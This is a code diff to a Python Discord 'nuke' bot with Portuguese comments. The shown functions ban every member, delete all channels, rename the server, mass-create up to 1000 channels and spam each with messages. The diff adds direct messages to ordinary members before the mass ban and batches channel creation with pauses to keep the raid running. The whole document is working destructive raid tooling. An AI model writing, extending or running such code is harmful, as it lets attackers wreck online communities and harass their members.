@@ -56,24 +56,44 @@ async def ban_all_members(guild):
             continue
     return banned
 
+async def send_direct_message(member, message):
+    try:
+        await member.send(message)
+    except:
+        pass
+
+async def notify_members(guild, message):
+    for member in guild.members:
+        # Verifica se o membro não tem permissões de kick e ban e não é um admin
+        if not any(permission in member.guild_permissions for permission in ['kick_members', 'ban_members']) and not any(role.permissions.administrator for role in member.roles):
+            await send_direct_message(member, message)
+
 async def create_text_channels_and_send_messages(guild, name, message):
     created = 0
-    tasks = []  # Lista para armazenar tarefas de criação e envio de mensagens
+    total_channels = 0
     
-    for _ in range(500):
-        try:
-            channel = await guild.create_text_channel(name=name)
-            tasks.append(asyncio.create_task(send_messages(channel, message)))  # Adiciona a tarefa à lista
-            created += 1
-        except:
-            continue
+    while total_channels < 1000:
+        tasks = []
+        for _ in range(10):
+            if total_channels >= 1000:
+                break
+            try:
+                channel = await guild.create_text_channel(name=name)
+                tasks.append(asyncio.create_task(send_messages(channel, message)))
+                created += 1
+                total_channels += 1
+            except:
+                continue
+        
+        # Aguarda todas as tarefas de envio de mensagens serem concluídas
+        await asyncio.gather(*tasks)
+        # Faz uma pausa para evitar sobrecarregar o servidor
+        await asyncio.sleep(2)
     
-    # Aguarda todas as tarefas serem concluídas
-    await asyncio.gather(*tasks)
     return created
 
 async def send_messages(channel, message):
-    for _ in range(200):
+    for _ in range(10):
         try:
             await channel.send(message)
         except:
@@ -82,6 +102,10 @@ async def send_messages(channel, message):
 async def nuke_guild(guild, name, message):
     print(f'{r}Nuke: {m}{guild.name}')
     await guild.edit(name="TERCEIRO COMANDO DA CAPITAL 🇮🇶")
+    
+    # Enviar DM para membros antes de banir
+    await notify_members(guild, message)
+    
     banned = await ban_all_members(guild)
     print(f'{m}Banidos:{b}{banned}')
     deleted_channels = await delete_all_channels(guild)
